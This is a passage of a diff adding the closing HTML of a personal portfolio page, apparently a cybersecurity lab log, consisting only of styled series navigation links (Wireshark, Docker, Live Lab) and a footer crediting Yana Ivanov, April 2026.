+  </div>
+</div>
+
+<!-- SERIES NAV -->
+<div style="padding-top:1.5rem;margin-top:0">
+  <div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:.2em;color:#94a3b8;text-transform:uppercase;margin-bottom:1rem">This Series</div>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem">
+    <a href="lab_log_009.html" style="font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.08em;padding:1rem 1.25rem;border:1px solid #cbd5e1;color:#64748b;text-decoration:none;text-align:center;display:block;transition:border-color .2s,color .2s,background .2s" onmouseover="this.style.borderColor='#1a4fa0';this.style.color='#1a4fa0';this.style.background='rgba(26,79,160,.05)'" onmouseout="this.style.borderColor='#cbd5e1';this.style.color='#64748b';this.style.background='transparent'">Part 1 — Wireshark</a>
+    <a href="lab_log_009b.html" style="font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.08em;padding:1rem 1.25rem;border:1px solid #cbd5e1;color:#64748b;text-decoration:none;text-align:center;display:block;transition:border-color .2s,color .2s,background .2s" onmouseover="this.style.borderColor='#1a4fa0';this.style.color='#1a4fa0';this.style.background='rgba(26,79,160,.05)'" onmouseout="this.style.borderColor='#cbd5e1';this.style.color='#64748b';this.style.background='transparent'">Part 2 — Docker</a>
+    <span style="font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.08em;padding:1rem 1.25rem;border:1px solid #1a4fa0;color:#1a4fa0;background:rgba(26,79,160,.07);text-align:center;display:block;font-weight:700">Part 3 — Live Lab</span>
+  </div>
+</div>
+
+</div></div>
+
+<footer>
+  <span>Lab Log 009 Part 3 &nbsp;·&nbsp; Yana Ivanov &nbsp;·&nbsp; April 2026 &nbsp;·&nbsp; Controlled lab &nbsp;·&nbsp; Educational use only</span>
+  <a href="../index.html" style="color:#4a9eff;text-decoration:none;white-space:nowrap">← Portfolio</a>
+</footer>
+
+</body>
+</html>
